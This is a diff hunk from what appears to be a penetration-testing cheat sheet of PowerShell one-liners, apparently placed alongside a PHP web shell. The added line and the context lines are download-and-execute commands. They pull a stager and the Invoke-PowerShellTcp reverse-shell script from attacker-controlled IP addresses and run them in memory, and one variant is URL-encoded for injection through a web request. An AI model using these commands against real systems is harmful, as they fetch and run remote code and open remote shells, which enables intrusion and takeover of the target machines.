@@ -15,6 +15,8 @@ echo "<pre>$output</pre>";
 
 #Powerhshell get file from server:
 powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.16.65/Invoke-PowerShellTcp.ps1')
+#DL & Exec:
+powershell.exe -c "IEX((iwr -UseBasicParsing http://192.168.49.92/stg_tcp_x86_11-2.txt).Content)"
 #URL Encoded:
 powershell.exe+IEX(New-Object+Net.WebClient).downloadString('http%3a//10.10.16.65/Invoke-PowerShellTcp.ps1')
 #Just download:
